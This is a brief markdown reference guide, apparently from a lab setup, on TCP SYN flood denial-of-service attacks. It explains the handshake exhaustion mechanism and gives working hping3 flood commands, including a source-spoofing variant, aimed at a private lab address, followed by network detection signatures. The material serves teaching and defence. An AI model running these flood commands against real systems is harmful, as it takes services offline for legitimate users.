# TCP SYN Flood Denial of Service - Attacker Reference Guide

This folder documents standard TCP SYN flooding commands and theoretical parameters using the `hping3` utility against a designated private target (e.g., `192.168.56.20`).

## 1. Overview of TCP SYN Floods
A TCP SYN flood exploits the TCP three-way handshake mechanism. The attacker sends a high volume of TCP SYN packets, often spoofing the source IP address. The target responds with SYN-ACK and keeps the connection state in the half-open queue, waiting for the final ACK that never arrives. This exhausts connection resources, preventing legitimate users from establishing connections. This maps to **MITRE ATT&CK T1498.001 (Direct Network Flood)**.

## 2. Command Reference

### Standard TCP SYN Flood
Sends TCP SYN packets with zero delay (flood mode) to port 80 (HTTP) or another service.
```bash
hping3 -S -p 80 --flood 192.168.56.20
```
* **`-S`**: Specifies TCP SYN flag.
* **`-p 80`**: Targets port 80.
* **`--flood`**: Sends packets as fast as possible.

### Spoofed Source TCP SYN Flood
Floods the target while spoofing random source IPs to bypass simple IP filtering.
```bash
hping3 -S -p 80 --flood --rand-source 192.168.56.20
```
* **`--rand-source`**: Generates random source IP addresses for outgoing packets.

## 3. Network Detection Signatures
* High rate of incoming TCP SYN packets on service ports (e.g. 80, 22) without corresponding ACK packets.
* Exponential rise in TCP connections in the `SYN_RECV` state (viewable via `ss -ant` or `netstat -ant`).
* Syslog alert: "Possible SYN flooding on port X. Sending cookies."
* High rates of dropped connections on the target interface.
